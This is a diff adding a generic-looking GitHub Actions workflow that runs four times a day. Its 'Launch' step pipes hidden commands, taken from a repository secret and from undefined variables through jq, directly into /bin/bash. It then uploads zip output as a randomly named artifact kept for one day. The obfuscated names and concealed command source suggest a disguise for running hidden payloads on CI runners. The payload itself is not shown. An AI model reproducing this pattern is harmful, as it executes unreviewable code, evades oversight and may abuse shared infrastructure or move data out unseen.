@@ -1,0 +1,39 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          o95: ${{ secrets.o95 }}
+        run: |
+          printf '%s' "$o95" | jq -r .t99 | /bin/bash
+          echo $k2790 | jq -r .mdk72 | /bin/bash
+          echo $k9 | jq -r .hb9492 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: iQMRpqEw
+          path: "*.zip"
+          retention-days: 1
